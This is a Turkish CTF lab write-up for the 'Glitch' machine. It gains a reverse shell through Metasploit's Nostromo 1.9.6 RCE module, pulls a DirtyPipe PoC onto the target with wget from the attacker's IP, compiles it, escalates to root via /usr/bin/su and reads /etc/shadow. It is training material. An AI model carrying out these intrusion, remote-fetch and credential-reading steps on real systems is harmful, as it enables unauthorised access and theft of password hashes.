# Glitch CTF Write-Up

## Makine Bilgileri
* **Hedef IP / Hostname:** `172.20.6.54` / `goldnertech.hv`
* **Saldırgan IP (LHOST):** `10.8.136.22`
* **İşletim Sistemi:** Linux Debian (Kernel `5.11.0-051100-generic`)
* **Tespit Edilen Zafiyetler:** 
  * Nostromo 1.9.6 Remote Code Execution (CVE-2019-16278)
  * DirtyPipe Privilege Escalation (CVE-2022-0847)

---

## 1. Keşif ve Ağ Taraması (Reconnaissance)

İlk olarak hedef makinenin ağ üzerinde aktif olup olmadığını doğrulamak amacıyla ICMP ping testi gerçekleştirilmiştir.

```bash
ping goldnertech.hv
```

<img width="1256" height="390" alt="1" src="https://github.com/user-attachments/assets/18ac507a-3b61-40f3-a76e-a4da990a9f0d" />


Makinenin erişilebilir durumda olduğu doğrulandıktan sonra, üzerindeki açık portları ve çalışan servis versiyonlarını tespit etmek amacıyla Nmap ile kapsamlı bir servis taraması yapılmıştır.

```bash
nmap -sC -sV -T4 172.20.6.54
```

<img width="1281" height="550" alt="2" src="https://github.com/user-attachments/assets/e7cf1e51-1be1-457c-8c30-f63b1d2c8094" />


**Nmap Taraması Sonuçları:**
* **Port 22/tcp:** OpenSSH 8.4p1 Debian
* **Port 80/tcp:** Nostromo 1.9.6 HTTP Web Sunucusu

---

## 2. İlk Erişim (Initial Access)

Port 80 üzerinde çalışan **Nostromo 1.9.6** servisinin bilinen Uzaktan Kod Çalıştırma (RCE) zafiyetlerini araştırmak için `msfconsole` başlatılmış ve arama yapılmıştır.

```bash
msfconsole
msf > search nostromo 1.9.6
```

<img width="1918" height="397" alt="3" src="https://github.com/user-attachments/assets/ad65e639-8b7a-4649-b6d7-0ec2f7be71cb" />


Arama sonucunda `exploit/multi/http/nostromo_code_exec` modülü tespit edilmiştir. Modül seçilerek hedef IP (`rhosts`) ve kendi IP adresimiz (`lhost`) konfigüre edilmiştir.

```bash
use exploit/multi/http/nostromo_code_exec
set rhosts 172.20.6.54
set lhost 10.8.136.22
```

<img width="1285" height="141" alt="4" src="https://github.com/user-attachments/assets/5b364252-0e20-46ac-b3aa-24d8938015d0" />


Exploit tetiklenerek hedef sistem üzerinde `www-data` kullanıcısı yetkileriyle bir reverse shell oturumu elde edilmiştir.

```bash
exploit -j -z
```

<img width="1907" height="451" alt="5" src="https://github.com/user-attachments/assets/fdcb313b-3fee-4834-ae79-5608e7b52210" />


---

## 3. Sistem İçi Keşif (Local Enumeration)

Yetki yükseltme (Privilege Escalation) vektörlerini belirlemek adına öncelikle hedef sistemin Linux çekirdek (Kernel) sürümü kontrol edilmiştir.

```bash
uname -a
```

<img width="1801" height="111" alt="6" src="https://github.com/user-attachments/assets/19b3b677-f5d6-4a35-8d99-4353b8ac304d" />


Sistemin `Linux debian 5.11.0-051100-generic` çekirdek sürümünü kullandığı görülmüştür. Olası yetki yükseltme açıklarını otomatik analiz etmek için `linux-exploit-suggester.sh` betiği hedef makineye aktarılmış ve çalıştırılmıştır.

```bash
cd /tmp
wget http://10.8.136.22/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

<img width="1484" height="899" alt="7" src="https://github.com/user-attachments/assets/0e9a02e7-8403-4f24-90b7-e4cc4b91af49" />


Betiğin çıktıları incelendiğinde, mevcut Kernel sürümünün **CVE-2022-0847 (DirtyPipe)** zafiyetine karşı duyarlı olduğu tespit edilmiştir.

<img width="1102" height="240" alt="8" src="https://github.com/user-attachments/assets/88d7d4da-3d41-4635-b2fa-1200b2f1ed83" />


---

## 4. Yetki Yükseltme (Privilege Escalation)

DirtyPipe zafiyeti, SUID yetkisine sahip binary'leri geçici olarak manipüle ederek root kabuğu (shell) elde etmeye olanak tanır. PoC kodunun (`dirtypipez.c`) çalışma mantığı incelenmiştir.

<img width="1024" height="997" alt="9" src="https://github.com/user-attachments/assets/8958c75a-1330-41d5-8c81-de8306ac6d52" />


Exploit kaynak kodu saldırgan makinesinden hedef sistemin `/tmp` dizinine indirilmiş ve GCC derleyicisi kullanılarak derlenmiştir.

```bash
cd /tmp
wget http://10.8.136.22/dirtypipez.c
gcc dirtypipez.c -o dirtypipez
```

<img width="1525" height="466" alt="10" src="https://github.com/user-attachments/assets/1e9b5f07-3a9b-48c9-8ed5-a45fb109ff46" />


Derlenen zararlı binary, SUID yetkisine sahip `/usr/bin/su` dosyası hedef gösterilerek çalıştırılmıştır. Exploit SUID binary'sini manipüle edip root yetkilerine sahip kabuğu açmış ve ardından binary'yi orijinal haline geri döndürmüştür.

```bash
./dirtypipez /usr/bin/su
```

<img width="1177" height="297" alt="11" src="https://github.com/user-attachments/assets/a1c2d241-f046-40fd-8e95-6edec6952e1c" />


`#` yetkisi alındıktan sonra root dizinine geçiş yapılmış ve hassas sistem dosyalarından biri olan `/etc/shadow` okunarak root yetkisi tamamen doğrulanmıştır.

```bash
cd /root
cat /etc/shadow
```

<img width="1807" height="890" alt="12" src="https://github.com/user-attachments/assets/7507f14f-0098-4d9e-b8d3-f214625acf28" />


---

## 5. Özet ve Sonuç
1. **Nmap** ile Nostromo 1.9.6 web sunucusu tespit edildi.
2. **Metasploit** kullanılarak `nostromo_code_exec` zafiyeti üzerinden `www-data` kullanıcısıyla sisteme sızıldı.
3. **Linux Exploit Suggester** ile Kernel 5.11 üzerinde **DirtyPipe (CVE-2022-0847)** açığı belirlendi.
4. `dirtypipez.c` PoC derlenerek `/usr/bin/su` üzerinden yetki yükseltildi ve **Root** erişimi sağlandı.
